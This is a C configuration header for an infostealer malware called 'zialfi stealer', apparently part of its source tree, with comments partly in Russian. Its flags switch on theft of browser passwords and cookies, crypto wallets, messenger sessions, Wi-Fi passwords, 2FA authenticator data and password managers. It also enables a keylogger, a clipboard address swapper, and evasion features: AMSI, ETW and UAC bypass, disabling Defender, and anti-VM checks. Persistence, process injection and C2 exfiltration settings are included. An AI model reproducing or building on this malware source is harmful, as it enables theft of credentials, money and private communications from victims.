/*
 * config.h — Feature flags for zialfi stealer
 *
 * Откомментируй флаг чтобы отключить модуль.
 * Меньше модулей = меньше бинарник = меньше surface detection.
 */

#ifndef CONFIG_H
#define CONFIG_H

/* ═══════ Crypto Constants ═══════════════════════════════════════ */

#define MIRAGE_SEED            0xAA870885
#define MIRAGE_SSN_XOR_KEY     0xA3B5C7D9

static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
    0xd6, 0x26, 0xe9, 0xcd, 0xfe, 0xc0, 0x8d, 0xd5, 0x0c, 0x24, 0x57, 0x0f, 0xb2, 0x7b, 0x9a, 0xe7   /* polymorphic */
};
/* ═══════ Anti-Analysis Thresholds ═══════════════════════════════ */

#define VM_MIN_RAM               (4ULL * 1024 * 1024 * 1024)  /* 4 GB */
#define VM_MIN_CPU_CORES         2
#define VM_MIN_SCREEN_WIDTH      800
#define VM_MIN_SCREEN_HEIGHT     600
#define VM_TIMING_ANOMALY_TSC    0x1000
#define EVASION_SCORE_THRESHOLD  90    /* Если score >= 90, процесс завершается */

/* ═══════ Browser Stealer ════════════════════════════════════════ */

#define ENABLE_CHROMIUM_STEALER     /* 58 Chromium: Chrome, Edge, Brave, Opera, ... */
#define ENABLE_FIREFOX_STEALER      /* 10 Gecko: Firefox, Waterfox, Pale Moon, ... */
#define ENABLE_KILL_BROWSERS        /* Kill browser processes before file access */
#define ENABLE_ELEVATOR_IMPERSONATION /* winlogon.exe token impersonation for App-Bound */
#define ENABLE_CDP_GRABBER          /* Chrome DevTools Protocol cookie extraction */
#define ENABLE_RAW_EXPORT           /* Export raw browser DB files + master key */

/* ═══════ Wallets ═══════════════════════════════════════════════ */

#define ENABLE_WALLET_EXTENSIONS    /* 96 extension кошельков (MetaMask, Coinbase, ...) */
#define ENABLE_WALLET_DESKTOP       /* 38 desktop кошельков (Exodus, Electrum, ...) */

/* ═══════ Messengers ═════════════════════════════════════════════ */

#define ENABLE_DISCORD              /* Discord: tokens, billing, settings */
#define ENABLE_TELEGRAM             /* Telegram: sessions, databases */
#define ENABLE_SIGNAL               /* Signal: config, databases */
#define ENABLE_SKYPE                /* Skype: profile, messages */
#define ENABLE_VIBER                /* Viber: databases, media */
#define ENABLE_WHATSAPP             /* WhatsApp: databases, media */
#define ENABLE_ICQ                  /* ICQ: messages, config */
#define ENABLE_PIDGIN               /* Pidgin: .purple profile */
#define ENABLE_SESSION              /* Session: databases */
#define ENABLE_TOX                  /* Tox: profiles */
#define ENABLE_ELEMENT              /* Element (Matrix): databases */
#define ENABLE_JABBER               /* Jabber/XMPP: Psi, Gajim */
#define ENABLE_OUTLOOK              /* Outlook: PST, config */
#define ENABLE_MICROSIP             /* MicroSIP: config */

/* ═══════ System ═════════════════════════════════════════════════ */

#define ENABLE_SYSTEM_INFO          /* OS, CPU, RAM, IP, network */
#define ENABLE_WIFI_PASSWORDS       /* WiFi profiles + пароли */
#define ENABLE_KEYLOGGER            /* WH_KEYBOARD_LL hook (требует GUI) */
#define ENABLE_SCREENSHOT           /* GDI BitBlt → BMP */
#define ENABLE_CLIPBOARD            /* CF_UNICODETEXT → UTF-8 */
#define ENABLE_FILE_GRABBER         /* Desktop/Documents/Downloads, 10MB limit */
#define ENABLE_SEED_PHRASE_GRABBER  /* BIP39 wordlist scan (2048 слов) */
#define ENABLE_CLIPPER              /* BTC/ETH/LTC address swap в clipboard */

/* ═══════ Gaming ═════════════════════════════════════════════════ */

#define ENABLE_GAMING_STEAM         /* Steam: config.vdf, userdata, CS2 */
#define ENABLE_GAMING_MINECRAFT     /* Minecraft: saves, versions, 18 лончеров */
#define ENABLE_GAMING_ROBLOX        /* Roblox: AppData data */

/* ═══════ VPN ═══════════════════════════════════════════════════ */

#define ENABLE_VPN_NORDVPN
#define ENABLE_VPN_WIREGUARD
#define ENABLE_VPN_OPENVPN
#define ENABLE_VPN_SURFSHARK
#define ENABLE_VPN_EXPRESSVPN
#define ENABLE_VPN_CYBERGHOST
#define ENABLE_VPN_PIA              /* Private Internet Access */
#define ENABLE_VPN_MULLVAD
#define ENABLE_VPN_WINDSCRIBE
#define ENABLE_VPN_TUNNELBEAR
#define ENABLE_VPN_HOTSPOT_SHIELD
#define ENABLE_VPN_VYPRVPN
#define ENABLE_VPN_HAMACHI
#define ENABLE_VPN_HIDEMYNAME
#define ENABLE_VPN_IPVANISH
#define ENABLE_VPN_RADMINVPN
#define ENABLE_VPN_SOFTETHER
#define ENABLE_VPN_PROTONVPN

/* ═══════ 2FA Authenticators ════════════════════════════════════ */

#define ENABLE_2FA_GOOGLE           /* Google Authenticator */
#define ENABLE_2FA_MICROSOFT        /* Microsoft Authenticator */
#define ENABLE_2FA_AUTHY            /* Authy (Traktor) */
#define ENABLE_2FA_DUO              /* Duo Mobile */
#define ENABLE_2FA_OTP              /* OTP Auth */
#define ENABLE_2FA_FREEOTP          /* FreeOTP */
#define ENABLE_2FA_AEGIS            /* Aegis Authenticator */

/* ═══════ Password Managers ═════════════════════════════════════ */

#define ENABLE_PM_BITWARDEN
#define ENABLE_PM_1PASSWORD
#define ENABLE_PM_LASTPASS
#define ENABLE_PM_NORDPASS
#define ENABLE_PM_DASHLANE
#define ENABLE_PM_ROBOFORM
#define ENABLE_PM_KEEPASSXC
#define ENABLE_PM_Keeper

/* ═══════ Evasion ═══════════════════════════════════════════════ */

#define ENABLE_AMSI_BYPASS          /* Patch amsi.dll */
#define ENABLE_ETW_BYPASS           /* Patch ntdll!EtwEventWrite */
#define ENABLE_UAC_BYPASS           /* Fodhelper auto-elevation */
#define ENABLE_PEB_HIDE             /* Corrupt DOS header to hide from scanners */
#define ENABLE_DEFENDER_DISABLE     /* Registry-based disable */
#define ENABLE_ANTI_ANALYSIS        /* 15 weighted checks */
#define ENABLE_DETECTION            /* VM/debugger/process detection */
#define ENABLE_MUTEX                /* Single-instance event */

/* ═══════ Cleanup ═══════════════════════════════════════════════ */

#define ENABLE_PERSISTENCE          /* Registry/Task Scheduler/Startup/WMI */
#define ENABLE_SELF_DELETE          /* 3-level deletion */
#define ENABLE_TEMP_WIPE            /* Очистка TMP/TEMP */

/* ═══════ SOCKS5 Proxy ════════════════════════════════════════ */
#define ENABLE_SOCKS5
#define SOCKS5_HOST     "127.0.0.1"
#define SOCKS5_PORT     9050

/* ═══════ Process Injection ════════════════════════════════════ */

#define ENABLE_PROCESS_INJECTION
#define INJECT_TARGET    "notepad.exe"

/* ═══════ C2 Configuration ═══════════════════════════════════════ */

#define ENABLE_C2_EXFIL             /* Upload loot to C2 panel */
#define C2_HOST                "127.0.0.1"
#define C2_PORT                9999
#define C2_TOKEN               "changeme"

/* #define ZIALFI_DEBUG */  /* Uncomment to enable debug output */

#ifdef ZIALFI_DEBUG
    #define dbg_printf(...) printf(__VA_ARGS__)
#else
    #define dbg_printf(...) ((void)0)
#endif

/* ═══════ Test Mode — skip blocking checks for smoke testing ═══ */
/* #define ZIALFI_TEST_MODE */

#endif /* CONFIG_H */
